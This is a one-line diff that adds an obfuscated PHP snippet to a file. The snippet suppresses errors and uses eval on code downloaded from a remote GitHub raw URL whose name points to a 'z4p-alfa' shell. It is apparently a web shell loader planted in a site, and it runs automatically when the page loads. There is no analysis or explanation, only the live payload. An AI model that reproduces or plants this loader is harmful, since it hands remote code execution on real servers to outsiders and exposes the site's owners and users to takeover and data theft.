@@ -1,0 +1,1 @@
+<?=/****/@/*55555*/null; /******/@/*55555*/eval/******/("?>".file_get_contents("https://raw.githubusercontent.com/z4phyr/Z4PHY-PHANT0MHIVE/main/z4p-alfa/z4p-alfa.php"))/******/ /*Z4PHY PHANT0MHIVE*/?>
